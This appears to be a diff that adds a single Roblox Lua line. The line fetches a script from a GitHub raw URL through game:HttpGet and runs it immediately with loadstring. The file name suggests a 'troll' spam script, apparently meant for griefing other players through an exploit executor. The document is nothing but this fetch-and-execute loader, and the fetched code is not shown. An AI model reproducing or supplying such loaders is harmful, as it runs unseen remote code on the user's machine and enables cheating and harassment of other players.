@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/troll-hug-tower-spam1-jzsi0c0vhiiw2g.lua"))()
